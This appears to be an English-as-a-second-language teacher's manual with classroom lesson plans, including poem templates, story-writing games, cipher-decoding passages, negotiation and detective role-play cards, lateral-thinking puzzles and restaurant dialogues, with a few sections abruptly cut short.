*	Pencils or pens
*	Blackboard
*	Student workbook 
*	Examples of the target poems
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
There is no special preparation for this lesson.

Warm Up (5 minutes):
Write some sample poems on the board. Have the class try to 
work out the structure of the poem. Discuss the poems and 
poetry.

Activity (35 minutes):
Report on a poem
Students will work in small groups of 3 or 4. Give a sample 
poem to each group as a guide to help them construct their own 
poems. Have each group talk about their assigned poem and how 
it makes them feel. The students must then report their 
response to the class. They need to answer the question: What 
is the relationship between the first and last line of the 
poem? This part of the activity should take about 15 minutes.
 
Creation of a poem
Write the structural form of the five line poem on the board:
Line 1: Dog = 1 NOUN-A  
Line 2: Friendly, playful = 2 related ADJECTIVES  
Line 3: Jumping catching rolling = 3 descriptive GERUNDS (verb 
+ -ing)  
Line 4: Someone to be there. = 1 complete, related SENTENCE  
Line 5: A true friend = 1 NOUN-B (a synonym of NOUN-A)

Have the students create their own poems based on the template 
and with the help of the sample poems. This part of the 
activity should take about 20 minutes.

Sample poems:

River
by Miki

River
Clear, wonderful
Slapping, whirling, flowing
The river is cold.
Water
Dove
by Min

Dove
Active, free
Flying, sitting, crying
A dove is free.
Bird

Try to write three of your own to fit the level of the 
students in the class. Good poems should be kept to show 
subsequent classes. 

Summary (5 minutes):
The teacher should find a way to publish the poems. Have the 
students share their poems with the class. Remind the students 
of the difficulty of writing/creating poems and how the 
students must be really good writers.



===Diamante Poem===

Objectives:
Students will be shown examples of diamante poems, be 
encouraged to talk about the sample poems, and (both as a 
class and as individuals) create diamante poems.

students share their poems with the class. Remind the students 
of the difficulty of writing/creating poems and how the 
students must be really good writers.




===ABC Story===

Objectives:
Students will be encouraged to use their knowledge of English 
in a new and creative way, to construct a cohesive story under 
a set structure, and be encouraged to think and write quickly 
in English.
Materials needed:
*	Pencils or pens
*	Blackboard
*	Student workbook
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
There is no special preparation for this lesson.

Warm Up (10 minutes):
Explain that today the students are going to create stories 
using the alphabet.

Alphabetical Cat
Using the alphabet, students will create adjectives to 
describe a cat.
E.g. My cat is an adorable cat. My cat is a beautiful cat… and 
so on.

The class should go through the entire alphabet. It helps 
sometimes to write the alphabet on the board and let students 
fill in the slots as they think of an adjective, rather than 
going around in a circle. But it can be done both ways

Activity (30 minutes):
ABC Story
The students need to write a story where the first sentence 
begins with the letter “A” the next with the letter “B”… and 
so on. Using the workbook students can work in pairs or on 
their own. Students need to be encouraged to write quickly as 
it may be difficult to finish the story. If the story cannot 
be finished, then it can be assigned as homework to be 
finished.

Summary (5 minutes):
Stories, if finished, can be read in class. Students should be 
reminded of the skills that they are working on. They have 
been learning how to think and write quickly in English.



===10 Questions===

Objectives:
Students will be shown the connections between comprehension 
questions and text and be given the chance to work creatively 
with English.
Materials needed:
*	Pencils or pens
*	Pre-generated set of comprehension questions
*	Student workbook
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
The activity can be done either alone or in pairs. Each 
student (or pair) should be given a copy of warm up text and a 
copy of the ‘10 Questions’. Ensure the students are made aware 
of the objectives. Further explain that they will be shown the 
outline for a fictional story (i.e. setting, problem, 
conflict, resolution). Also, they will create a piece of 
fiction based on possible answers to the comprehension 
questions. The key is to make them understand how this will 
help their understanding of how stories work and how it will 
help them answer comprehension questions.

Warm Up (10 minutes):
Give the students the story to read. Ask them to make up a 
comprehension question for the story. The students should 
exchange questions and answer them. The teacher should 
introduce the idea of writing a story based on comprehension 
questions


Activity (30 minutes):
Write the ’10 Questions’ on the board. The students will have 
a copy of the ten questions in their workbook. Use the first 
question as an example to begin the story. The students will 
have to supply all the missing information to properly answer 
the question (E.g. Why did they go to the house? A student may 
write… John and Scott went to the house to try and find the 
ghost’s gold.) More advanced students may write two or three 
sentences that together answer the one comprehension question 
(E.g. John rushed to the house after school. Scott was waiting 
for him with a flashlight and a shovel. They hoped today they 
would find the gold if the ghost didn’t find them first.) The 
students write a story based on the ten questions.

Variation
The basic idea is the same but the teacher reveals the 
questions one at a time. The teacher can also give the 
students an opportunity to generate some of the questions.

The ’10 Questions’ for “The House on the Hill”
(Teachers may generate their own questions to create a 
different type of story.)

Why were the two kids friends?
What did the house look like?
Why did they go to the house?
What did they see when they opened the door?
Who screamed?
Why did they go into the kitchen?
Who went down to the basement?
What was found in the attic?
Who helped them to escape?
How did they feel when they got home?

The first three questions describe the setting of the story. 
Questions 4-7 centre around the conflict. Questions 8 and 9 
are the climax. And the last question is the resolution.

The teacher should create their own story based on these 
questions to read to the class AT THE END OF THE CLASS. Don’t 
read it before, as every story will sound like yours.

Summary (5 minutes):
Read your story to the class. Have the students exchange 
stories and read them. Remind students of the structure of the 
story. Remind students to use this structure in their own 
writing and to look for it in the stories they read and the 
movies they watch.

===Nomics===
Nomics are games in which writing the rules of the game is the game itself. See [http://www.langwidge.com/ruler_of_the_wall_updated.pdf Ruler of the Wall] for an example of how a nomic could be incorporated into the classroom.

trouble for playing hooky, fighting and breaking rules.
*	It is not his first offense. A year ago he was accused of 
stealing $25 from the drugstore where he had a Saturday 
job. He was let go with a warning.

Summary (5 minutes):
Review the objectives of the lesson and discuss the most 
interesting case the class presented.



===Airport / Going on Vacation===

another country. They must decide in their group which country 
they will visit using polite discussion. 

The students must now plan their trips. They are to decide 6 
things to do or see in their destination country. Again, 
polite discussion is used to convey a student’s opinion to the 
other group members. Tell the students to complete the Travel 
Itinerary in their workbook.

When the students have finished their travel schedule they 
must write a postcard on the page provided in their workbooks. 
Explain to the students the addressing format used in foreign 
countries that is the opposite order to the Korean system.

===Two Situations===

Objectives:
To stimulate students creative thinking and exercise their 
decision making skills.
Materials needed:
*	Student workbook
*	Pens / pencils
*	Blackboard
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
There is no special preparation for this lesson.

Warm Up (10 minutes):
Write a set of opposites on the board (e.g. hot / cold). Have 
the students decide, in turn, what they prefer. Try to use IRE 
method described at the beginning of the teacher’s manual.

Activity (30 minutes):
Group the students into pairs and have them look at Situation 
1 in their workbook. Read through it with the whole class, and 
then let the students work out their answers. Circulate among 
the groups to help them with any problems they might be 
having. After about 10 minutes of writing have one student 
from each group make a report about their country. Repeat the 
exercise with Situation 2. Ensure that a new student from each 
group reports on Situation 2.

Situation 1

Imagine you could create a completely new country made up of 
the best things from at least five other countries. What would 
this country be like? What would it be called? You have 10 
minutes to think of the answers.

Think about:
*	the food
*	the standard of living
*	the culture
*	the people
*	the political system
*	the scenery
*	the natural resources
*	anything else? (specify)
*	the climate 

Write down the details, then one of you can report to the rest 
of the class.
For example:
Our new country would be called …
It will have a climate like … (warm and sunny in the summer 
and…)
It will have a standard of living like…, etc.

Situation 2.

Imagine you could be frozen at the time of death and brought 
back to life again in 200 years time. In what ways do you 
think things will have changed? You have 10 minutes to think 
of the answers.


Think about: 
*	countries
*	space exploration
*	life span
*	transport
*	computers
*	family life (marriage, children, etc.)
*	jobs 
*	homes
*	anything else? (specify)

Write a paragraph to describe these changes. Then one of you 
can read it out to the rest of the class.

Summary (5 minutes):
Discuss some of the more interesting or controversial 
decisions made by your groups.



===What’s in a Job===

Objectives:
This is a decision making activity designed for groups of 
students, in which they have to guess what criteria others 
have used in putting ten jobs in order of importance.
Materials needed:
*	Student workbook
*	Pens / pencils
*	Blackboard
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Copy and cut out the job cards on the page following this 
lesson summary. Laminate them if possible. You should have 
three complete sets of cards available to use.

Warm Up (10 minutes):
Review the 10 jobs used in the lesson to ensure the students 
understand what each job is. (doctor, priest, politician, pop 
star, entertainer, a housewife, a factory worker, a teacher, a 
journalist, a garbage man, a police officer)

Activity (30 minutes):
Put the students into groups of three or four. Give each 
student a deck of cards and have them randomly select a card. 
The students work alone at first and order their jobs 
according to the criteria on their card. They write their 
answers in their workbook. Make sure they don’t let anyone 
else in the group see their card. Students now take it in 
turns to read out their order. When they have finished, the 
others try to guess what the order was based on.

Summary (5 minutes):
Conclude by selecting a few of the students and have them 
explain their reasoning.

==Problem Solving==





===Cryptology===

Objectives:
To get students to understand how to break down words to 
figure out their meaning and to think critically about English 
grammar and sentence patterns to decode the passage.
Materials needed:
*	Blackboard
*	Pens / pencils
*	Student workbook
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Make sure that students have their (paper or electronic) 
dictionaries put away for the warm up of the lesson. However, 
they can use them for the decoding activity.

Warm Up (10 minutes):
Write the word “Cryptology” on the blackboard and ask if any 
students know what it means. If nobody knows the word, ask 
what “-ology” means. The students should respond “the study 
of.” Then ask the students if they have other examples of 
words with the “-ology” suffix and write them on the board. 
With the words that the students supply, ask them what the 
prefix/root word means. For example, if the students give the 
words biology, geology, and technology, ask them what bio- 
(life), geo- (Earth), and techno- (skill) mean. Then explain 
that “crypto-” means hidden (from the Greek word “kryptos”) 
and ask if any students can now figure out what “cryptology” 
means. If still nobody figures it out, tell them that 
cryptology is the study of breaking code. If the warm-up needs 
to be extended, the teacher can ask the students when codes 
are used (i.e. government, computers, military, etc).

Activity (30 minutes):
There are three different encoded passages with this lesson 
varying in difficulty. The easiest passage is a simple 
reversed frame-shift so once the students figure out the 
pattern, it becomes quite simple to break the code. The medium 
and hardest difficulty passages have randomly selected 
encryption keys. However, the medium does not substitute 
vowels.

The teacher needs to assess the students’ ability and choose 
the difficulty he or she deems appropriate. Alternatively, the 
teacher can also allow the students to individually choose the 
difficulty with which they would like to challenge themselves.

Have the students turn to the appropriate page with the 
selected encrypted passage. Explain that every letter 
represents another letter and that their task is to break the 
code. Initially, the only hint that should be given is for the 
students to think about what they know about English grammar 
and sentences. For example, “a” is the only one-letter, 
lowercase English word so the students quickly be able to 
decode all the a’s in the passage. There are other patterns 
such as “’s” for possessives and words like of, in, on, and at 
that always proceed other words. Do not give students these 
hints unless necessary.

Once a student has broken the code, there is no need for 
him/her to decode the whole passage, as it would just be busy 
work. Instead, tell the student to work on one of the other 
passages.

Summary (5 minutes):
To conclude the lesson, review the root word + suffix warm up 
and ask students what patterns they notice to break the code.

Easy Passage – Unencrypted

Jason had a temperature of 102° F. His head was stuffed; his 
bones ached and his throat was very sore. He knew he had the 
flu. All his friends had been sick with it. He had used up all 
the creams and herbs that his mother had carefully packed and 
put in his suitcase, saying, “Just in case you get sick.”

After three days of lying in bed, feeling miserable, Jason 
decided to go to the doctor. He described all his symptoms and 
was sure that the doctor would give him a shot that would make 
him feel much better. Instead, she told him to get plenty of 
rest and to drink lots of liquids. She gave him a prescription 
to fill and said that in two or three days he would be feeling 
better.

As he left, the receptionist told him that his visit would 
cost $35. Jason paid the money and left the doctor’s office 
feeling angry.

The Planets are in Motion
The planets move around the Sun along oval-shaped paths called 
orbits. One complete path around the Sun is called a 
revolution. Earth takes one year, or 3651/4 days, to make one 
revolution around the Sun. Planets that are farther away from 
the Sun take longer. Some planets have one or more moons. A 
moon orbits a planet in much the same way that the planets 
orbit the Sun. 

Each planet also spins (or rotates) on its axis. An axis is an 
imaginary line running through the center of a planet. The 
time it takes Earth to rotate on its axis equals one day.

Can Chickens Fly? 
The chicken has wings, but can’t fly. Chickens used to fly in 
the past like all birds. But they started to live with people 
and changed. Their bodies got bigger but their wings got 
smaller. So now they can’t fly. But a chicken called Sheena 
did fly in 1985. She was a fighting chicken in America. Sheena 
flew 192.07 meters!

The Most Famous Chicken
There are about 500 kinds of chickens in the world. But there 
was one very famous chicken. In 1945, in Colorado, U.S., there 
was a chicken called Michael. Michael is in the 1947 Guinness 
Book of World Records. This chicken was born without a head. 
But he could still live! However, in 1947, something terrible 
happened. While Michael was eating, food got stuck in his 
throat and he died. 

What Do They Eat?
Chickens usually eat what their owners give them. But they 
also find food on their own. They eat bugs that move around on 
the ground. They swallow food because they do not have teeth. 
They also eat sand and dirt.

Why Do Chicken Hate the Hot Weather?
People sweat so we can control heat. Chickens do not have 
sweat glands. They are covered with feathers. They have to 
make themselves cool by opening their mouths. They also flap 
their wings. That is why they do not like the hot weather.

How Do Chicken Sleep?
Have you seen chicken sleeping on poles? They look as if they 
will fall but they don't. This is because they hold onto the 
poles very tightly. Chicken used to be flying birds that lived 
on branches. So their natural habits are shown while they 
sleep.

Have You Ever Seen a Chicken in Your Dreams?
Seeing a chicken in your dream is good luck! If you chased 
chickens, you will get a lot of money. If you see a chick 
hatching from its egg, something good will happen. If you see 
a chicken head, your family may be in luck. But if you see a 
headless chicken, this is not a good dream. Something bad may 
happen to you.

Were You Born in the Year of the Rooster?
Then, you are a very loyal person. Also, you try very hard at 
almost everything. You also have a big imagination. You like 
adventure. And you work hard to achieve your goals.

===Negotiating===

Objectives:
Students will learn a variety of negotiating tactics, be 
taught to convey information quickly and effectively, and will 
learn to solve problems through compromise.
Materials needed:
*	Blackboard
*	Pens / pencils
*	Student workbook
*	“Go between” role cards
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
The room should be set up so that there are six different 
stations. Each group of three will be divided into Person A, 
Person B, and negotiator. The two people need to be separated 
by a little distance. Copy and cut out the neighbor cards 
following the summary of this lesson. Laminate them if 
possible. You will need at least three complete sets.

Warm Up (10 minutes):
Describe for the group the four types of negotiators. Write 
the types of the boards and then verbally describe one. The 
students must guess which one you are describing.



Types:
A.	Good/Bad Cop
B.	B. Friends
C.	Ultimaters
D.	D. Bullies

Descriptions:
A.	The crudest negotiating tactic of all usually starts with 
disparaging remarks about the other person. A bully 
doesn't need a valid reason to attack; it's in their 
nature to pick on someone who won't fight back. The 
attack is a tactic designed to break down your position.
B.	Phrases such as &quot;You have to do better than that&quot;, or 
&quot;Take it or leave it&quot;. The aim is to make the negotiator 
worry about the future of a talk. They want you to feel 
that you have to accept their idea because they won’t 
negotiate anymore.
C.	&quot;I love your idea, I want to do it, but I just can’t&quot;. 
The person believes that if they manage to make friends 
with you, then you will do what they want out of 
friendship.
D.	There are usually two of them. One of them is to be a bad 
guy, his aim is to discomfort you by being aggressive, 
making ridiculous demands. The second one is a good guy, 
his job is to be balanced and apologetic for his partner.

Answers
1D 2C 3B 4A

Activity (30 minutes):
(10 minutes for each set of role cards)

Put your students in groups of three or four. The students are 
each given a set of the ‘Neighbor’ role cards. The two 
students playing the neighbors sit on different sides of the 
room. Each of the three groups will use the neighbor role 
cards. The go-between must help the two neighbors come to an 
agreement. The go-between must carefully and accurately report 
the demands/proposals of the neighbors. The teacher can 
recommend that the neighbors use some of the negotiating 
tactics described in the warm up but this is not necessary.

After about 8 minutes, the groups can compare their solutions.

The go-between should take the place of one of the neighbors 
and then the teacher should hand out the Husband/Wife role 
cards.

Repeat once more with the ‘Country role cards’.

Summary (5 minutes):
Remind the class about the different ways to negotiate. The 
class can talk about which ways were the most effective when 
trying to reach a solution. The class can talk about how they 
compromise…who…when…why…



Neighbor A
You’re fed up with your neighbor’s behavior.
*	You wish they’d:
*	Turn down their TV
*	Keep their dogs out of your back garden
*	Stop parking in front of your gate
You also wish they’d stop complaining about you: you don’t see 
why you should change your lifestyle.
Neighbor B
You’re fed up with your neighbor’s behavior.
*	You wish they’d:
*	Prevent their teenagers from having late night parties
*	Chop down the big tree in their garden
*	Pick up their baby when it cries instead of letting him 
scream
You also wish they’d stop complaining about you: you don’t see 
why you should change your lifestyle.
Go-Between
You have to carry messages from one person to the other. Your 
object is to get them to reach an agreement, but you must 
report exactly what they said to each other.



Husband
You wish your wife would:
*	Stop complaining
*	Have dinner ready every evening when you come home
*	Stop quarreling with your mother
But you don’t see why you should change anything about your 
lifestyle.
Wife
You wish your husband would:
*	Help in the house occasionally
*	Look after the children sometimes
*	Talk to you in the evenings instead of slumping in front 
of the TV
But you don’t see why you should change anything about your 
lifestyle.
Go-Between
You have to carry messages from one person to the other. Your 
object is to get them to reach an agreement, but you must 
report exactly what they said to each other.



Paranoia
Your neighboring country Neurotica is causing a lot of 
problems:
*	They are illegally occupying part of your territory on 
the Eastern border.
*	They are destroying large areas of rain forest, which is 
causing flooding and damage to land in your country.
*	Their high taxes on food imports are crippling your 
economy.
You don’t want to start a war: you’d prefer to solve these 
problems through negotiation. At the same time, you don’t want 
to give way on any issue.
Neurotica
Your neighboring country Paranoia is causing a lot of 
problems:
*	They are illegally occupying part of your territory on 
the Western border.
*	They have built a nuclear power plant near the border.
*	They have a ban on car imports (your main industry).
You don’t want to start a war: you’d prefer to solve these 
problems through negotiation. At the same time, you don’t want 
to give way on any issue.
Go-Between
You have to carry messages from one person to the other. Your 
object is to get them to reach an agreement, but you must 
report exactly what they said to each other.



===Think Bowl===

Objectives:
To make criteria, or methods of ranking or evaluating 
solutions for a problem, to think creatively by brainstorming 
(thinking of everything they can about one subject, as a 
group) criteria and problems, to act out a problem and 
solution.
Materials needed:
*	Blackboard
*	Pens / pencils
*	Student workbook
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Arrange tables for students to sit in two teams. Write 
objectives on the board.

Warm Up (10 minutes):
Explain what a problem is in Korean “munje”. Present a 
problem, like “ Are school uniforms the best way to dress 
students?” (a problem with many solutions) that possibly 
relates to the student’s lifestyle. Other examples of problems 
might be &quot;What can we do so there are fewer cars?&quot; or &quot; How 
can we make students happier?&quot; With an advanced class you may 
choose to brainstorm to find a problem and write it on the 
board. Students then brainstorm solutions to the problem, 
writing down every idea their team comes up with. One team 
member can write the solutions



Activity (30 minutes):
The groups must now decide on how to set criteria to assess 
the solutions to the problems. Write A, B, C, D, E on the 
board as column headers. The teacher can provide some of the 
criteria.

For example:
*	Is this idea original?
*	Do we like this idea?
*	Would other people like this solution?
*	Is it feasible (doable, can it be done)?
*	Does the idea work, does it solve the problem?

Alternatively you can have the groups can decide on the 
criteria. You must have a total of five criteria. On a five by 
ten or twenty grid provided in the workbook (an example of the 
grid follows the lesson summary) the criteria are written at 
the top of the five columns, and the solutions are written in 
the ten or twenty rows. Then going down one column, each 
solution is rated by the criteria on a scale of one to ten. 
For example, if the solution in row one was to allow for 
school uniforms to be optional, and the criteria in column A 
was “Is this idea original?”, a number from one to ten would 
be written in the box for column one, row one.

When finished with the ratings, the numbers across one row are 
added up, the total points for the evaluations of the 
solutions resulting.

Finally the solution with the highest score is then used as 
the subject to perform a skit or short play, depending on the 
nature of the solution, it can be acted, spoken, mimed or a 
combination of these. Encourage loud talking for the skit. 

Summary (5 minutes):
The teacher can show how the objectives were met, ask students 
to suggest other ways to meet the objectives, and conclude 
with praise.

===Detective Work===

Objectives:
To solve a crime using detective work and guessing, deductive 
reasoning, ordering events. To report past events, practice 
past tenses (perfect), and learn some everyday activity 
vocabulary – (crime, committed, chatted, knock, neighbor)
Materials needed:
*	One set of cards and one introduction sheet for each 
group, three to four sets
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Copy and cut out the clue cards at the end of this lesson 
summary. Laminate them if possible. You will need three or 
four complete sets. Write objectives on the board.

Warm Up (10 minutes):
Arrange the students into groups of three or four. Tell the 
students “You are the famous detectives Sherlock Holmes and 
Watson” or some similar phrase to introduce the detective 
activity. Inform the students that a murder was committed last 
night. An old lady was found dead in her living room. She had 
been hit on the head with a frying pan, and jewelry worth five 
thousand dollars had been taken from the house. (Do a concept 
check to see if students understand past perfect, it can 
equate to past tense for some purposes, and is used for news 
reports or reports sometimes). The murder occurred between 
seven and ten-thirty p.m. One of the principal suspects is 
Annie Hudson, the district nurse, who has the key to the old 
lady’s house, and who lives ten minutes walk away.

Activity (30 minutes):
Distribute a deck of clue cards to each group. Ensure that the 
cards are shuffled and in a random order. The cards contain 
details of Annie’s movements that evening. The students should 
read them together, and try to work out if she could have 
committed the murder or not. Since the cards have been 
shuffled, the events will be in a muddled order.

Students should turn up one card at a time from the pile, and 
discuss the probable sequence of events together.

The object of the game is to reconstruct Annie’s evening and 
to work out if she could have committed the murder or not. The 
group that finishes first is the winner. .

Filler: Have a mock trial or kangaroo court to try the guilty 
party.

Summary (5 minutes):
Review the vocabulary for comprehension as a concept check; 
discuss alternative possibilities (who might or might not have 
been the murderer).
   



At seven o’clock she went 
to her sister’s house for 
half an hour.
A friend came to call at 
seven forty-five.
By the time her friend 
knocked on the door, she 
had already started to cook 
supper.
Her friend stayed to eat 
supper.
Her friend left shortly 
after nine p.m.
She had just said goodbye 
to her friend when the 
phone rang.
She had just finished 
speaking to Uncle Bill on 
the phone when there was a 
knock on the door.
Her neighbor wanted to 
borrow some sugar.
She invited her neighbor in 
and they chatted until 
about ten.
She had just said goodbye 
to her neighbor when the 
phone rang again. It was 
her friend, who had 
forgotten her handbag.




She had just put the phone 
down when her husband, her 
son and friend came in.
They had all been to see a 
film.
After they had had coffee 
and talked about the film, 
they all went to bed. 

A murder was committed last night. An old lady was found 
dead in her living room. She had been hit on the head with 
a frying pan, and jewelry worth five thousand dollars had 
been taken from the house. The murder occurred between 
seven and ten-thirty p.m. One of the principle suspects is 
Annie Hudson, the district nurse, who has a key t the old 
lady’s house, and who lives ten minute’s walk away. The 
cards contain details of Annie’s movements that evening. 
Read them together, and try to work out if she could have 
committed the murder or not. Since the cards have been 
shuffled the events will be in a muddled order. Turn up 
one card at a time from the pile and talk about what 
happened and when it happened: what happened before it, 
what happened after it.




===Situational Puzzles===

Objectives:
By asking the teacher questions about curious situations, 
students will practice abstract thinking and speaking skills. 
In particular, students will have to ask limiting questions 
and think creatively by imagining a whole scenario. They will 
be able to establish logical connections between events and 
understand how it can be succinctly expressed.
Materials needed:
*	Blackboard
*	Pens / pencils
*	Student workbook
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
There is no special preparation for this lesson.

Warm Up (10 minutes):
Use some logic-testing questions to get students thinking. 
Write a few of these questions on the board and see who can 
answer correctly:
*	Ask students to write this down as one number: 15 
thousand, 15 hundred and 15. (Answer: 16,515)
*	“What was the highest mountain on earth before Mount 
Everest was discovered?” (Answer: Still Mount Everest)“
*	Take three apples from five apples. How many do you 
have?” (Answer: Three)
*	“How many children does a woman have if she has ten 
daughters and each daughter has a brother?” (Answer: 
Eleven)
*	“Some months have 30 days and some have 31. How many 
months have 28 days?” (Answer: All twelve)
*	“How many birth days does the average person have?” 
(Answer: Only one – the day you were born)

Activity (30 minutes):
Depending on how students have done in the warm up, choose the 
appropriate puzzle from this list and write it on the board 
(they get increasingly more difficult). 
 
1.	“A birdwatcher sees an unexpected bird. Soon, he’s dead. 
How did this happen?”
2.	“He was killed by breakfast.”
3.	“A woman buys a new pair of shoes, goes to work and 
dies.”

Underneath write YES on one side and NO on the other. Tell 
students they can ask only yes or no questions in order to 
guess the whole story behind the death. Write their questions 
on the appropriate sides. 

After several queries, say if they can figure out what job the 
person does or where they are, the answer will be easier. Give 
example questions, such as “Is the birdwatcher in the forest?” 
Provide hints that narrow down the area of information needed 
to arrive at the answer. For instance, tell them that he is 
traveling. Suggest asking if he’s inside or outside, in the 
air or on the ground, etc. For number one, once the students 
have determined that the birdwatcher is on an airplane, it 
should be relatively easy for them to figure the way in which 
he was killed. The answer is: ‘He is a passenger on an 
airplane and sees the bird get sucked into the engine at 
20,000 feet.’ 

The same method applies to numbers two and three as well. The 
answer to 2 is ‘The man is camping in the mountains. He makes 
breakfast, and then puts pepper on his food. The pepper makes 
him sneeze loudly, which starts an avalanche that kills him.’ 

In the case of number 3, the woman’s profession is the key 
factor in solving the puzzle. Therefore, students must be 
instructed to ask questions that will limit the range of 
possible occupations. If necessary, provide clues such as 
‘medicine’, ‘education’, or ‘show business’. Once they’ve got 
the right field, then a further narrowing down of questioning 
can follow. From ‘show business’, go to ‘movies’ and 
‘television’ and, finally, ‘circus’. The answer for number 3 
is: ‘The woman is an assistant to a knife-thrower in a circus. 
The new shoes have higher heels than the ones she used to 
wear, so the thrower misjudges his aim and one of his knives 
kills her during the show.’

Summary (5 minutes):
Review the objectives of the lesson, ensuring all students 
realize the importance of asking relevant and specific 
questions in order to understand the cause and effect of a 
given situation.







==Situational English==





===Drama and Acting===

Objectives:
To learn to act out a situation to an audience, to gain 
confidence in speaking and presenting to groups, and to 
practice expressing feelings in English
Materials needed:
*	Puppets
*	Student workbook
*	Pens or pencils
*	Dice
*	Whiteboard and marker
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Write the objectives on the board, and arrange tables for 
groups of three to four to prepare a skit or little play of no 
more than three minutes duration. Write ten phrases or short 
sentences like “ I am hungry”, and ten emotions next to them. 
Write some situations on the board that can lend themselves to 
a short skit. For example:
*	You want to convince your parents to let you go to a late 
concert.
*	You want to convince your parents to buy a new computer.
*	You are trying to stop a schoolyard fight.
*	You are lost and need directions to find the bus stop.
*	Your best friend is moving to another province.
*	Etc.


Warm Up (10 minutes):
Ask the class some questions such as:
“Who wants to be or wanted to be a movie star or actor or 
actress?”
“Who would you like to be in the movies, or what movie would 
you like to be in?”

Explain to the students that “Today, you can make and act in 
your own play, like a movie. Please use body language or 
movements to give the feeling and meaning of your play, and 
speak loudly enough so everyone can hear.”

Randomly choose one emotion and one phrase from your list on 
the board. Then select a student to act out the combined idea 
(e.g. “Sadly, I am hungry”).

Activity (30 minutes):
Tell the class to choose one of the topics suggested, 
brainstorm others, or use one of their own to write a three-
minute play. The play will be about a situation possible in 
real life or an imagined one. They have 20 minutes to do this. 

Do not give the students the list of suggested topics until 
they have first tried to think of one on their own. 

They have the option to use hand puppets (provided by the 
teacher). This can aid shy students by acting as a prop to 
distract from shyness. 

One person from another team can act as Master of Ceremonies 
to introduce the group. Ensure that a group member introduces 
their stage names, and the name of their play or skit. They 
will perform and act the skit or short play they have 
prepared. This part of the activity should take about 10 
minutes

Fillers:
*	One word is given to the students, writing it on the 
board, or the group choosing one, one student must say it 
many different ways, trying to demonstrate different 
feelings.
*	A brief discussion of what the students liked best or 
least about the skits or short plays can conclude the 
activity.

Summary (5 minutes): 
Point back to the objectives written at the beginning, and ask 
the following questions. Did they feel the objectives were met 
for them? What could they suggest as an improvement to better 
meet the objectives? Finish with “ well done”, “ good job”, or 
some positive note, e.g. “ I thought I noticed an improvement 
in your speaking, it was louder and easier to hear.”

===Meteorology===

Objectives:
The objective of this lesson is for the students to learn 
vocabulary associated with meteorology. Students will also 
prepare and present a weather report to the class.
Materials needed:
*	Blackboard
*	Student Workbook
*	Pens / Pencils.
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
There is no special preparation for this class.

Warm Up (10 minutes):
Define the word meteorology to the class as “The science of 
the atmosphere especially weather conditions.” Talk to the 
class about meteorology vocabulary such as:

Summer
Winter
Spring
Fall
Autumn
Cold
Hurricane
Tornado
Cyclone
Earthquake
Tsunami
Blizzard
Avalanche
Drought
Flood
Hail
Fine 
Cloudy
Stormy
Hot

Write the four seasons as column headers on the blackboard. 
Brainstorm with the class a list of words for each season.

Activity (30 minutes):
Start the class by drawing a map of an imaginary country on 
the board. Mark on the map some imaginary cities. Students 
should generate the names for the cities.
The teacher should give a demonstration weather report using 
the map on the blackboard. Be sure to point to the particular 
cities when doing the weather report. 
Tell the students that in their groups they are going to 
create and present a weather report similar to the ones they 
see on the television news. 

E.g. 
In Smithtown today it was rainy with a temperature of 25 
degrees. Maplesville was fine and hot with a temperature 
of 32 degrees. Tomorrow in Smithtown, the rain will 
finish and it will be a sunny day with a temperature of 
29 degrees and Maplesville will be the same as today. 
People in Seaport City should be careful because there is 
a typhoon coming toward you tomorrow.

The students should use a page from their workbook to draw the 
imaginary country and prepare for the weather report. The 
weather report should have the weather from today, and the 
forecast for tomorrow. The students should use some of the 
vocabulary they have acquired in the warm-up lesson. The 
students should include the weather for 5 different cities.

While the students are working, circulate around the room and 
correct grammar and vocabulary.

When the students are finished, give some practice time and 
have them present their reports to the class.

Summary (5 minutes):
Review the objectives of the lesson and conclude.




===Restaurant===

Objectives:
The objective of this lesson is to teach students useful 
restaurant English. The lesson also stresses the importance of 
being polite when speaking to other people.
Materials needed:
*	Blackboard
*	Student Workbook
*	Pens / Pencils.
Vocabulary substitution:
Review the following vocabulary with the class:
To place an 
order
I would like …
Are you ready to 
order?
Complaint
Waiter / Waitress / 
Customer
The bill
The tip
Daily Specials / 
Specials of the Day


Procedure:
Setting Up the Classroom:
Copy and cut out the Customer Sheet, Waiter Sheet, Menus, 
Complaints, and Special of the Day pages following this lesson 
summary. Laminate them if possible. You will need 
approximately four sets of these pages.

Warm Up (10 minutes):
Brainstorm some different types of restaurants on the 
blackboard.

Tell the students that they will be ordering food from 
restaurants today. Call a student to the front of the class 
and give the student a menu. After the student has had a short 
time to look at the menu, say, “May I take your order?” 
Explain that just barking out orders to waiters can be 
perceived as rude and can have negative consequences. If the 
student gives a more sophisticated answer, the teacher should 
write it on the board and then begin to discuss other ways of 
ordering food. 

Activity (30 minutes):
Have three students act out the dialog for ordering food 
(Waiter, Customer 1, Customer 2). As a class briefly discuss 
the dialog and ways to order food.

Do a role-play activity to practice ordering food. Divide the 
class into three groups. Some students will be waiters and the 
other students will pair up and go around to the various 
restaurants and order food. The waiters are given “Special of 
the Day” prompt cards and their activity sheet. As customers 
visit their restaurants, waiters have to write down the orders 
on their activity sheets. The customers must write down what 
they ordered on the customer activity sheets. The teacher 
should also instruct some of the waiters to be rude and 
insulting on purpose to the customers to see their reactions. 
Talk about complaints and give some examples of complaints 
made in a restaurant. 

Making a menu.
Tell the class that they are going to make a menu for their 
imaginary restaurant. This is done on the blackboard as a 
class activity. They must choose:
*	Name and type of restaurant (e.g. Ed’s Chicken Town)
*	Menu items
*	Beverages
*	Desserts
*	Specials of the day

Summary (5 minutes):
Review the new phrases and vocabulary introduced in the 
lesson. Review the objectives of the lesson and conclude.

===At a Party===

Objectives:
This activity is a simple, yet effective role-play where 
students imagine they are extremely successful and famous 
people who meet other equally successful and famous people at 
a 5 star hotel. It gives students the opportunity, amongst 
other things, to try their hand at “acting.”
Materials needed:
*	Blackboard
*	Student Workbook
*	Pens / Pencils.
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
There is no special preparation for this lesson.

Warm Up (10 minutes):
